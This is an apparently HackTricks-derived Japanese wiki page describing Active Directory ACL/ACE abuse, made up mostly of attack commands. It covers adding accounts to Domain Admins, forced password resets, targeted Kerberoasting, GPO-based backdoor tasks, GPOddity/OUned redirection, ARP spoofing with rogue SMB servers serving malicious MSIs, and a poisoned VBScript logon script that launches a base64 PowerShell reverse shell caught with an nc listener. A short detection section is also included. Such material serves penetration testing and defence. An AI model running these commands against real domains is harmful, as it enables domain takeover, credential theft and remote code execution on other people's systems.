# Active Directory ACL/ACE の悪用

{{#include ../../../banners/hacktricks-training.md}}

**このページは主に、** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **および** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges) **の手法をまとめたものです。詳細については、元の記事を確認してください。**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

削除済みオブジェクトの ACL の悪用やアカウントの再アニメーションについては、[AD Recycle Bin による再アニメーション](../privileged-groups-and-token-privileges.md#reanimating-a-deleted-account-through-delegated-acls)を参照してください。

## **ユーザーに対する GenericAll 権限**

この権限により、攻撃者は対象ユーザーアカウントを完全に制御できます。`Get-ObjectAcl` コマンドを使って `GenericAll` 権限があることを確認したら、攻撃者は次の操作を実行できます。

- **対象ユーザーのパスワードを変更する**: `net user <username> <password> /domain` を使って、攻撃者はユーザーのパスワードをリセットできます。
- Linux では、Samba の `net rpc` を使って SAMR 経由で同じ操作を行えます。<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **アカウントが無効化されている場合は、UACフラグをクリアする**: `GenericAll` があれば `userAccountControl` を編集できます。Linuxから、BloodyADを使って `ACCOUNTDISABLE` フラグを削除できます:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: ユーザーアカウントにSPNを割り当ててkerberoast可能にし、RubeusとtargetedKerberoast.pyを使ってticket-granting ticket（TGT）のハッシュを抽出し、crackを試みます。

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: ユーザーの事前認証を無効化し、そのアカウントをASREPRoastingに対して脆弱にします。

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: ユーザーに対する `GenericAll` があれば、証明書ベースのcredentialを追加し、パスワードを変更せずにそのユーザーとして認証できます。以下を参照してください。

{{#ref}}
shadow-credentials.md
{{#endref}}

## **グループに対するGenericAll権限**

この権限により、攻撃者は `Domain Admins` などのグループに対する `GenericAll` 権限を持っている場合、グループメンバーシップを操作できます。`Get-NetGroup` でグループの識別名を特定した後、攻撃者は次の操作を実行できます。

- **自分をDomain Adminsグループに追加する**: 直接コマンドを実行するか、Active DirectoryやPowerSploitなどのモジュールを使用します。

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Linuxからは、対象グループに対するGenericAll/Write membership権限を持っている場合、BloodyADを使って任意のグループに自分を追加することもできます。対象グループが「Remote Management Users」にネストされている場合、そのグループを適用しているホストで直ちにWinRMアクセスを獲得できます:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Computer/UserへのWrite**

コンピューターオブジェクトまたはユーザーアカウントに対するこれらの権限があると、次のことが可能になります。

- **Kerberos Resource-based Constrained Delegation**: コンピューターオブジェクトを乗っ取れます。
- **Shadow Credentials**: Shadow Credentialsを作成する権限を悪用し、コンピューターまたはユーザーアカウントになりすます手法です。

## オブジェクトを継承されたOU権限の適用先に移動する

アカウントに対する**移動権限**と、移動先OUから継承される**書き込み権限**を組み合わせることで、どちらのプリンシパルも当初はアカウントの機密属性を変更できない場合でも、権限を行使できます。ソースオブジェクトの移動権限と移動先の`CreateChild`を確認してから、オブジェクトを移動し、有効なDACLを再確認してください。たとえば、powerview.pyの`Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'`でユーザーを移動できます。その後、そのOUに継承された`GenericWrite`を持つ、制御下のグループが[shadow credential](shadow-credentials.md)を追加できます。移動しただけでは、継承権限は付与されません。<sup>[[18]](#references)</sup>

OUに対する`GenericAll`はあるものの、適切な継承ACEがない場合は、`bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>`を実行して、その子孫オブジェクトに適用されるACEを追加できます。対象アカウントは個別にテストしてください。**AdminSDHolderで保護されたアカウントでは継承が無効になっている**ため、OUのACEが一般ユーザーには適用されても、保護されたユーザーには適用されないことがあります。[AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group)を参照してください。<sup>[[18]](#references)</sup>

別の悪用経路として、特権を持つスケジュール済みクリーンアップスクリプトが、攻撃者の影響を受けるACEに基づいてOUを選択し、その子孫に対して`Set-ADObject -Clear adminCount`**と**`$acl.SetAccessRuleProtection($False, $False)`を実行する場合があります。OUのDACLを変更できる場合は、スクリプトが検査するグループに、必要な`ExtendedRight`または`GenericAll`のACEを付与してください。また、タスクを実行できることも別途確認してください。これにより、特権タスクが以前保護されていたアカウントの継承を再び有効にし、OUのACEを適用できるようになる場合があります。実際のスクリプト、実行トリガーの権限、変更後のDACLを確認してください。`adminCount`をクリアするだけでは継承は再び有効にならず、保護されたグループに残っているアカウントはSDPropによって再保護されることがあります。<sup>[[18]](#references)</sup>

## **グループに対するWriteProperty**

特定のグループ（例: `Domain Admins`）のすべてのオブジェクトに対する`WriteProperty`権限を持つユーザーは、次のことができます。

- **自分自身をDomain Adminsグループに追加する**: `net user`コマンドと`Add-NetGroupUser`コマンドを組み合わせて実行することで、ドメイン内で権限昇格できます。

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **グループに対する Self (Self-Membership)**

この権限により、攻撃者はグループメンバーシップを直接操作するコマンドを使って、`Domain Admins` などの特定のグループに自分自身を追加できます。次のコマンドを順に実行すると、自分自身を追加できます:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

同様の権限であるこの権限を持つと、攻撃者はグループに対する `WriteProperty` 権限がある場合、グループのプロパティを変更して自分自身を直接グループに追加できます。この権限の確認と実行は、次のように行います。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

ユーザーに対する `User-Force-Change-Password` の `ExtendedRight` を保持していると、現在のパスワードを知らなくてもパスワードをリセットできます。この権限の確認と悪用は、PowerShellや代替のコマンドラインツールで実行でき、対話型セッションや非対話型環境向けのワンライナーなど、ユーザーのパスワードをリセットする複数の方法があります。コマンドはシンプルなPowerShellの呼び出しから、Linux上での `rpcclient` の使用まで幅広く、攻撃ベクトルの多様性を示しています。

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **グループに対するWriteOwner**

攻撃者がグループに対する`WriteOwner`権限を持っていることを発見した場合、そのグループの所有者を自分に変更できます。対象のグループが`Domain Admins`の場合、グループの属性やメンバーシップをより広範囲に制御できるため、特に大きな影響があります。手順としては、`Get-ObjectAcl`で対象オブジェクトを特定し、`Set-DomainObjectOwner`を使ってSIDまたは名前を指定し、所有者を変更します。

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **ユーザーに対するGenericWrite**

この権限があると、攻撃者はユーザーのプロパティを変更できます。具体的には、`GenericWrite`アクセスを使ってユーザーのログオンスクリプトのパスを変更し、ユーザーのログオン時に悪意のあるスクリプトを実行できます。これは、`Set-ADObject`コマンドを使って、対象ユーザーの`scriptpath`プロパティを攻撃者のスクリプトを指すように更新することで実現します。

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

ユーザーの [`scriptPath` 属性](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e)にスコープを限定した`WriteProperty` ACEで十分な場合があり、`GenericWrite`は必要ありません。その属性への権限と、ドメインの`SYSVOL\<domain>\scripts`または`NETLOGON`ツリー内にある書き込み可能なスクリプトを組み合わせ、対象ユーザーがログオンしてそのスクリプトに到達する可能性を評価してください。スクリプトはログオン時にそのユーザーのコンテキストで実行されます。有効なAD ACLとファイル／共有ACLを個別に確認してください。一致するAllow ACEや書き込み可能なディレクトリだけでは、経路全体が成立するとは限りません。

## **Group に対する GenericWrite**

この権限があると、攻撃者は自分自身や他のユーザーを特定のグループに追加するなど、グループメンバーシップを操作できます。このプロセスでは、credential objectを作成し、それを使ってグループへのユーザーの追加または削除を行い、PowerShellコマンドでメンバーシップの変更を確認します。

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Linux から、グループに対する `GenericWrite` を持っていれば、Samba `net` を使ってメンバーを追加/削除できます（PowerShell/RSAT が利用できない場合に便利です）：<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

AD オブジェクトの所有権を持ち、そのオブジェクトに対する `WriteDACL` 権限があると、攻撃者は自身にそのオブジェクトに対する `GenericAll` 権限を付与できます。これは ADSI の操作によって実行でき、オブジェクトを完全に制御し、そのグループメンバーシップを変更できるようになります。ただし、Active Directory モジュールの `Set-Acl` / `Get-Acl` cmdlet を使用してこれらの権限を悪用しようとすると、制限があります。<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### WriteDACL/WriteOwner による迅速な乗っ取り（PowerView）

ユーザーまたはサービスアカウントに対して `WriteOwner` と `WriteDacl` を持っている場合、古いパスワードを知らなくても、PowerView を使って完全な制御を取得し、パスワードをリセットできます。

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

メモ:
- `WriteOwner` しか持っていない場合は、まず所有者を自分に変更する必要がある場合があります。

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- パスワードリセット後、任意のプロトコル（SMB/LDAP/RDP/WinRM）でアクセスを確認します。

## **ドメイン上のレプリケーション（DCSync）**

DCSync攻撃は、ドメイン上の特定のレプリケーション権限を悪用してDomain Controllerになりすまし、ユーザーの認証情報を含むデータを同期します。この強力な手法には、`DS-Replication-Get-Changes`などの権限が必要です。攻撃者はDomain Controllerに直接アクセスすることなく、AD環境から機密情報を抽出できます。<sup>[[5]](#references)</sup> [**DCSync攻撃の詳細はこちら。**](../dcsync.md)

## GPOの委任 <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPOの委任

Group Policy Objects（GPO）の管理を委任すると、重大なセキュリティリスクが生じる可能性があります。たとえば、`offense\spotless`のようなユーザーにGPO管理権限が委任されている場合、**WriteProperty**、**WriteDacl**、**WriteOwner**などの権限を持つ可能性があります。PowerViewを使って確認できるこれらの権限は、悪用されるおそれがあります: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPOの権限を列挙する

設定ミスのあるGPOを特定するには、PowerSploitのcmdletを連結して使用できます。これにより、特定のユーザーが管理権限を持つGPOを見つけられます: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**特定のポリシーが適用されているコンピューター**: 特定のGPOが適用されるコンピューターを特定することで、潜在的な影響範囲を把握できます。 `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**特定のコンピューターに適用されているポリシー**: `Get-DomainGPO`などのコマンドを使って、特定のコンピューターに適用されているポリシーを確認できます。

**特定のポリシーが適用されているOU**: `Get-DomainOU`を使って、特定のポリシーの影響を受ける組織単位（OU）を特定できます。

[**GPOHound**](https://github.com/cogiceo/GPOHound)を使用して、GPOを列挙し、問題を見つけることもできます。

### GPOの悪用 - New-GPOImmediateTask

設定ミスのあるGPOを悪用して、たとえば即時実行のスケジュールタスクを作成し、コードを実行できます。影響を受けるマシンのローカルAdministratorsグループにユーザーを追加することで、権限を大幅に昇格できます:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - GPO の悪用

GroupPolicy module がインストールされている場合、新しい GPO の作成とリンク、およびレジストリ値などの設定を行い、影響を受けるコンピューター上で backdoor を実行できます。この方法では、GPO が更新され、実行対象のコンピューターにユーザーがログインする必要があります。

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - GPOの悪用

SharpGPOAbuseは、新しいGPOを作成せずにタスクを追加したり設定を変更したりして、既存のGPOを悪用する方法を提供します。このツールを使用するには、既存のGPOを変更するか、RSATツールを使って新しいGPOを作成してから変更を適用する必要があります:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### ポリシーの強制更新

GPOは通常、約90分ごとに更新されます。この処理を早めるには、特に変更を実施した直後に、対象コンピューターで `gpupdate /force` コマンドを実行してポリシーを即時更新できます。このコマンドを使うと、次回の自動更新サイクルを待たずに、GPOへの変更が適用されます。

### 内部の仕組み

`Misconfigured Policy` のような特定のGPOのスケジュールタスクを調べると、`evilTask` などのタスクが追加されていることを確認できます。これらのタスクは、システムの動作変更や権限昇格を目的としたスクリプトやコマンドラインツールによって作成されます。

`New-GPOImmediateTask` が生成するXML構成ファイルには、実行するコマンドやトリガーなど、スケジュールタスクの詳細が記述されています。このファイルは、GPO内でスケジュールタスクを定義・管理する方法を示しており、ポリシー適用の一環として任意のコマンドやスクリプトを実行できます。

### ユーザーとグループ

GPOを使うと、対象システム上のユーザーやグループのメンバーシップも変更できます。Users and Groupsポリシーファイルを直接編集すれば、ユーザーをローカルの `administrators` グループなどの特権グループに追加できます。これは、GPOの管理権限を委任してポリシーファイルを変更し、新しいユーザーを追加したり、グループメンバーシップを変更したりできる場合に可能です。

Users and GroupsのXML構成ファイルには、こうした変更の実装方法が記述されています。このファイルにエントリを追加すると、対象システム全体で特定のユーザーに昇格した権限を付与できます。この方法では、GPOを操作して直接権限昇格を行えます。

ローカルグループメンバーシップやユーザー権利などのセキュリティ設定については、適用されるGPOテンプレート `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` と `SecEdit` ディレクトリのACLも確認してください。書き込み可能なディレクトリやファイルは調査の手がかりになりますが、変更が有効になるかどうかは、実際に有効なSYSVOL共有アクセス権、拒否ACLや継承ACL、Group Policyコンテナーのアクセス許可、ポリシーの適用範囲、クライアントの更新タイミングによって決まります。「GPO Managers」という名前のグループに所属しているだけでは、編集権限があるとは限りません。[Microsoftは、このテンプレートのパスと、Group Policyコンテナーとテンプレートの役割分担について説明しています。](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

さらに、ログオン／ログオフスクリプトの利用、自動実行用のレジストリキーの変更、.msiファイルによるソフトウェアのインストール、サービス構成の編集など、コード実行や永続化を実現する方法も検討できます。これらの手法を使うと、GPOの悪用を通じてアクセスを維持し、対象システムを制御できます。

### GPC/GPTの取得先を認証済みの不正サービスにリダイレクトする

GPOは、メタデータを格納するLDAP上の **Group Policy Container (GPC)** と、ポリシーファイルを格納するSMB上の **Group Policy Template (GPT)** で構成されます。更新時、クライアントはコンテナーの `gPLink` に従って参照先のGPCとその `gPCFileSysPath` を読み取り、そのUNCパスからGPTをダウンロードします。そのため、GPC自体、またはOU、Site、Domainの `gPLink` への書き込みアクセス権は、特権で実行されるポリシー処理の悪用につながります。<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### GPOddityによる `gPCFileSysPath` の汚染

制御下にあるプリンシパルが対象GPCに書き込める場合（直接、または **NTLM relay to LDAP** を介して）、`gPCFileSysPath` を攻撃者がホストするUNCパスに変更します。[GPOddity](https://github.com/synacktiv/GPOddity)はLDAPの変更を自動化し、モジュールベースのポリシーファイル、またはGroup Policyクライアントが `NT AUTHORITY\SYSTEM` として実行するImmediate Taskを含む悪意のあるGPTを配信します。<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

匿名共有や認証情報を問わないSMB共有では、現在のWindowsクライアントには不十分です。SMB Secure Negotiateは認証の成功を証明する必要があるため、不正サービス側でドメインIDを検証し、SMBセッションキーを導出したうえで、応答に正しく署名しなければなりません。埋め込みモードでは、制御下にあるマシンアカウントとそのサービスキーを使ってGPOddityを設定し、`[COMMANDS]` セクションでコンピューター側またはユーザー側のペイロードを選択します。<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**User GPO のエッジケース:** MS16-072 以降も、Windows は**同じ TCP 接続内に**2つの SMB2 セッションを作成します。ユーザーセッションが `GPT.INI` を読み取り、その後、コンピューターアカウントのセッションが `ScheduledTasks.xml` などの有効な構成を読み取ります。そのため、不正なサーバーは認証状態、セッションキー、署名キーをソケット単位ではなく SMB2 の `SessionId` 単位で管理する必要があります。GPOddity/OUned に組み込まれた Scapy fork は、`SMBStreamSocketMultiplexing` と多重化に対応した `SMBServer` によってこれを実現しています。単一セッションの Impacket/Scapy サーバーは、それ以外の場合、誤った署名状態を再利用してユーザーポリシーの処理に失敗します。<sup>[[15]](#references)</sup>

#### OUned による `gPLink` poisoning

OU、Site、Domain に対する `WriteGPLink`、`GenericWrite`、または同等の制御権がある場合、攻撃者は GPC DN が攻撃者の管理する LDAP ホストから提供されるリンクを追加できます。このプリミティブは Petros Koutroumpis が最初に紹介しました。[OUned](https://github.com/synacktiv/OUned) は LDAP への書き込みと悪意ある GPC/GPT チェーンを自動化します。<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

被害者はまず不正なLDAPサービスに認証し、`gPCFileSysPath`が不正なSMBサービスを指すGPCを受け取ります。次にSMBに認証し、提供されたGPTを適用します。そのためOUnedには、LDAP SPNを持つアカウント、SMB用のHOST SPNを持つマシンアカウント（同じマシンアカウントで両方を満たせます）、そしてポート389と445への接続をオペレーターのホストに転送するDNS解決またはリバースフォワーディングが必要です。<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUnedに組み込まれたScapy LDAP serverは、実際に制御可能なservice keyを使ってKerberos/SPNEGOを検証し、JSONから任意のGPC dataを提供します。空のJSON keyはrootDSEを表し、`base64:` prefixはbinary valueを表します。また、serverはadd/delete/modify/searchに加え、`BASE`、`LEVEL`、`SUBTREE`検索をサポートし、保護なし、integrity、confidentialityのいずれもネゴシエートできます。これにより、攻撃者が制御するLDAP referenceを参照しながら、認証済みLDAPを要求する別のWindows componentに対して、このserviceを再利用できます。<sup>[[15]](#references)</sup>

アカウントのpasswordをdummy domainに同期しても、すべてのKerberos keyが再現されるとは限りません。RC4はpasswordから導出されますが、AESのstring-to-keyでは、principalのhostname/domainから導出されるsaltも使用します。実際のアカウントのAES keyを`KerberosSSP`に渡せば、検知される可能性のあるmachine account自身で書き込み可能な`msDS-SupportedEncryptionTypes`の変更によって、RC4を強制する必要がありません。<sup>[[15]](#references)</sup>

#### 検知の手がかり

`gPCFileSysPath`または`gPLink`の変更を、GPO versionの変更や新たなImmediate/Scheduled Task XMLと関連付けて確認してください。想定外のnaming contextへのlink、承認済みDC/SYSVOL以外のUNC host、machine account名をリダイレクトするDNS record、通常と異なるmachine accountに対するLDAP/CIFS service ticket、RC4を有効にする`msDS-SupportedEncryptionTypes`の変更を調査してください。<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

OU/domainに対する`WriteGPLink`があれば、GPO自体を編集せずに、対象containerの`gPLink` attributeを変更して**既存のGPOを強制的に適用**できます。link先のGPOがすでに**UNC path**（`\\HOST\share\...`）経由でremote contentを参照している場合に有効です。認証済みユーザーは**SYSVOL**を読み取れるため、オフラインで再利用可能なpolicyを探せます。<sup>[[11]](#references)</sup>

大まかな手順:

1. BloodHoundを使って、OUに対する`WriteGPLink`を持つprincipalを特定し、そのOU内のcomputer/userを列挙します。
2. `SYSVOL`をread-onlyでcloneし、GPOを解析して、UNC pathを参照する**Software Installation**、**drive mapping**（`Drives.xml`）、**logon/startup script**を探します。
3. DFS/domain-namespace pathではなく、**直接のhostname**（例: `\\DC02\share\pkg.msi`）を指すpolicyを優先します。hostnameベースのpathはL2 spoofingでリダイレクトしやすいためです。
4. 選んだGPO GUIDを対象OUの`gPLink`に追加し、victimにその既存policyを処理させます。
5. 同じbroadcast domain上でUNC hostをARP spoofし、そのIPをローカルに割り当てます（`ip addr add <target_ip>/32 dev <iface>`）。これにより、victimのSMB trafficが攻撃者のhostに届きます。
6. 攻撃者のSMB server（例: `smbserver.py`）から想定されたpath/filenameを提供し、通常のpolicy処理を待ちます。

`SYSVOL`の収集とGPOの相関付けの例:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

既存のGPOを対象のOUにリンクします：

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

リンクされたGPOがUNCパスからMSIをデプロイする場合、クライアントは**コンピューターの起動時**にそれを取得し、**`NT AUTHORITY\SYSTEM`**としてインストールします。参照先ホストを偽装し、**同じ共有パス/パス/名前**で悪意のあるMSIを配信すれば、**SYSVOLを変更せずに**`WriteGPLink`をSYSTEM権限でのコード実行につなげられます。

重要な制約:

- **タイミングが重要**: 新しいリンクはポリシー更新時（通常は約90分ごと）に認識されますが、**Software Installation**は通常、**再起動時**に実行されます。
- Windows Installerは通常、パッケージの**`ProductCode`**を使ってデプロイを追跡します。製品がすでにインストールされている場合、デプロイがスキップされることがあります。
- インストーラーによる拒否を避けるには、不正なMSIにパッチを適用し、その**`ProductCode`**と**`PackageCode`**をGPOが想定する正規パッケージの値に一致させます。
- 古い`.aas`広告ファイルが`SYSVOL`に残っている場合があるため、この方法に頼る前にデプロイが引き続き有効に見えることを確認してください。

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Drive-map UNC hijack -> NTLM capture / WebDAV relay

`Drives.xml` 内の GPP ドライブマッピングにより、ユーザーはログオン時または再接続時に、設定された UNC パスに対して認証を行います。参照先ホストを spoof すると、**NetNTLMv2** を取得できます。SMB が意図的に失敗するようにすると、Windows は **WebDAV** 経由で再試行する場合があります。その際、**HTTP 経由で NTLM** が送信されるため、**LDAP(S)**、**AD CS**、**SMB** への relay の自由度が大幅に高まります。

#### Logon/startup script UNC hijack

同じ手法は、`SYSVOL` 内で見つかった UNC ホスト型スクリプトにも適用できます。

- **Logon scripts** は通常、**user** コンテキストで実行されます。
- **Startup scripts** は通常、**computer / SYSTEM** コンテキストで実行されます。

スクリプトのパスが spoof 可能なホスト名を指している場合、UNC ホストをリダイレクトし、想定された場所から置き換えたスクリプトの内容を配信します。

## SYSVOL/NETLOGON Logon Script Poisoning

`\\<dc>\SYSVOL\<domain>\scripts\` または `\\<dc>\NETLOGON\` 配下の書き込み可能なパスを使うと、GPO を介してユーザーのログオン時に実行されるログオンスクリプトを改ざんできます。これにより、ログオンしたユーザーのセキュリティコンテキストでコード実行が可能になります。

### ログオンスクリプトを特定する
- 設定済みのログオンスクリプトがあるか、ユーザー属性を確認します。

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- ドメイン共有をクロールして、スクリプトへのショートカットや参照を見つける:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- SYSVOL/NETLOGONを指すターゲットを特定するために`.lnk`ファイルを解析する（DFIRで役立つテクニックであり、GPOに直接アクセスできない攻撃者にも有用）:

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound は、存在する場合、ユーザーオブジェクトのログオンスクリプト属性 `scriptPath` を表示します。GPO で設定されたログオンスクリプトは別のポリシー参照であるため、該当する GPO も確認してください。

### 書き込みアクセスを検証する（共有の一覧を鵜呑みにしない）
自動化ツールでは SYSVOL/NETLOGON が読み取り専用と表示されても、対象のスクリプトには異なる NTFS ACL が設定されている場合があります。まず、そのファイルと親ディレクトリを読み取り専用で調査してください。一致する Allow ACE は候補として残ります。実効 SMB アクセスと NTFS アクセス、Deny ACE、現在のトークンがすべて関係するためです。

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

認可された書き込みテストは対象を限定し、元に戻せるようにしてください。元のスクリプトをバックアップして復元できるようにします。アクセス権をテストするためだけに、正常に動作しているログオンスクリプトを上書きしないでください。書き込みに成功すると、次のユーザーのログオン時に実行される可能性があります。

### VBScriptログオンスクリプトを改変してRCE
業務機能を損なわないよう元の処理を維持しつつ、PowerShell reverse shellを起動するコマンドを追加します（revshells.comで生成してください）：

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

ホスト上で待ち受け、次の対話型ログオンを待ちます:

```bash
rlwrap -cAr nc -lnvp 443
```

メモ:
- 実行はロギングユーザーのトークン（SYSTEMではない）で行われます。適用対象のスクリプトに対するGPOリンク（OU、サイト、ドメイン）がスコープとなります。
